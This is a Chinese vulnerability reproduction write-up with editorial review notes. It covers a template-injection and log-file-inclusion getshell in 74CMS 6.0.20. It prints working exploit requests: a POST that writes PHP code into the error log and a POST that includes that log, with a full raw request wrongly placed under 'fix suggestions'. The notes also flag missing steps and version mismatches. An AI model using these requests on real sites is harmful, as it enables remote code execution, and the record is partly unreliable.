---
source: "MrWQ/vulnerability-paper"
product: "74CMS6.0.20 /<6.0.48claimed"
record_type: "analysis"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "骑士 CMS 模版注入 + 文件包含 getshell 漏洞复现"
prerequisites: "来源所述条件，未列明部分仍待核：same694logchain;PHP5.4.45WindowsNginx;errorlogwrite/include"
side_effects: "未执行；本文需注意的操作影响：日志写入请求缺失、路径/日期错位需要回原稿核对；与同源副本可关联，但另一篇关于补丁后图片/doc 包含的独立分析应保留。"
source_status: "recorded"
source_url: "https://mp.weixin.qq.com/s/Jwi21tojlEj-2NF0nydaGQ"
id: "vw-1a9d0c28c37fd0f78fcdabf7"
entity_id: "ve-afc9452b653816f659eb58e3"
schema_version: "1"
canonical: "Web安全/CMS内容/奇安信攻防社区-骑士CMS模版/奇安信攻防社区-骑士CMS模版注入+文件包含getshell漏洞复现.md"
relation_type: "duplicate_of"
---

## 核对与使用边界


- 明确更正：“修复建议”下贴的是攻击 POST，不是修复措施或补丁链接；保留该错贴请求为历史样本。原 5.4.45 环境与建议 PHP≥5.5 不一致，不能把建议当最低可利用版本。
- 日志写入请求缺失、路径/日期错位需要回原稿核对；与同源副本可关联，但另一篇关于补丁后图片/doc 包含的独立分析应保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：same694logchain;PHP5.4.45WindowsNginx;errorlogwrite/include

- **证据待核（1）**：正文与694环境/段落/载荷同文，只图片转载URL不同；确认同源副本但须视觉核截图差异。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **事实待核（2）**：修复建议下误贴攻击POST而非补丁下载链接，明确跨段错位。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **事实待核（3）**：写日志完整请求缺失、日志路径放包含POST栏，日期样例互异，需核对各自实验环境。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **结论使用边界（4）**：建议PHP&gt;=5.5却测试5.4.45矛盾同694，保留测试样本不泛化最低要求。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（5）**：宜优先保留有完整原链接/请求的694并去其重复头，结合753独立补丁边界。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# 骑士 CMS 模版注入 + 文件包含 getshell 漏洞复现

<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/Jwi21tojlEj-2NF0nydaGQ)

**一、骑士 CMS 简介**

骑士人才系统, 是一项基于 PHP+MYSQL 为核心开发的一套 免费 + 开源 专业人才招聘系统，使用了 ThinkPHP 框架（3.2.3）；由太原迅易科技有限公司于 2009 年正式推出。为个人求职和企业招聘提供信息化解决方案, 骑士人才系统具备执行效率高、模板切换自由、后台管理功能灵活、模块功能强大等特点，自上线以来一直是职场人士、企业 HR 青睐的求职招聘平台。经过 7 年的发展，骑士人才系统已成国内人才系统行业的排头兵。系统应用涉及政府、企业、科研教育和媒体等行业领域，用户已覆盖国内所有省份和地区。2016 年全新推出骑士人才系统基础版，全新的 “平台 + 插件” 体系，打造用户 “DIY” 个性化功能定制，为众多地方门户、行业人才提供一个专业、稳定、方便的网络招聘管理平台，致力发展成为引领市场风向的优质高效的招聘软件

**二、环境搭建**


==============

此次采用 windows10+Nginx+MySQL+PHP，使用 phpstudy 进行的环境配置，注意 PHP 版本最好使用 PHP 5.5 及以上，MySQL 版本 5.7.6 及以上，我这里使用 PHP 版本 5.4.45

然后这里放一下骑士 cms 的下载链接:https://pan.hallolck.com/s/y06I6

**三、安装过程**


==============

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicoAP7KAOdlQKQH7icgPrVvd95pknLRgAEfDicbplLJ9Cia19PODjjRVWdA/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicgGqHicRiaBheHxicetKshNUddiablLYruE76ytRUWA5Bu3zrrMcXdzib8Bw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGic74ywjKznASBpH22nUDVuCjcE4fS1ibIGIibZhmmtaxKbND4LNejy5S1A/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicqribu12sm7df7BDmHf8GFMX3cho0l98IUSXjmicUdrGhljniblVykEstw/640?wx_fmt=png)

**四、漏洞概述**


==============

官方公告地址


----------

```
http://www.74cms.com/news/show-2497.html
```

/Application/Common/Controller/BaseController.class.php 文件的 assign_resume_tpl 函数因为过滤不严格，导致了模板注入，可以进行远程命令执行

**影响版本: 骑士 CMS < 6.0.48>**


------------------------------

**五、漏洞复现**


==============

**写入日志**

POST 参数：

```
http://your-ip/index.php?m=home&a=assign_resume_tpl
POST:
variable=1&tpl=<?php phpinfo(); ob_flush();?>/r/n<qscms/company_show 列表名="info" 企业id="$_GET['id']"/>
```

我们来 POST 一下看看

 可以看到返回了错误，日志已经记录了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicrxOfnV3cBe7QicQ22G0T0nATsXkI39odfFWhH7uCmI82M69G7UVftEg/640?wx_fmt=png)

我们来翻一下日志

成功写入

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGictBfqpTfB2Jhf8gJPdaibpOlov0IJia88jZNnNpVouNOOb1V774LE5qpQ/640?wx_fmt=png)

接下来我们尝试包含日志，日志名称就是测试当天的年月日

**包含日志**


------------

POST 参数：

```
日志路径: \upload\data\Runtime\Logs\Home
```

我们来 POST 一下看看

```
http://your-ip/index.php?m=home&a=assign_resume_tpl 
POST: 
variable=1&tpl=data/Runtime/Logs/Home/20_12_22.log
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/wQuKRAE0ouMUia0v5ARmBm1jiaX9h7sjGicJ9QLXAHXnNHreCAXcuSDEz3q0wL7AmpjDAwrHFRib2zM9tibtHkNZkfQ/640?wx_fmt=png)

**六、修复建议**  



=================

下载官方最新补丁包

```
POST /74cmsv6.0.20/upload/index.php?m=home&a=assign_resume_tpl HTTP/1.1
Host: 192.168.1.6
Content-Length: 52
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.6/74cmsv6.0.20/upload/index.php?m=home&a=assign_resume_tpl
DNT: 1
Connection: close
Cookie: PHPSESSID=vj12p9l3pnqkc09ostum5m7mfu; think_language=zh-CN; think_template=default
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

variable=1&tpl=./data/Runtime/Logs/Home/21_07_01.log
```

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
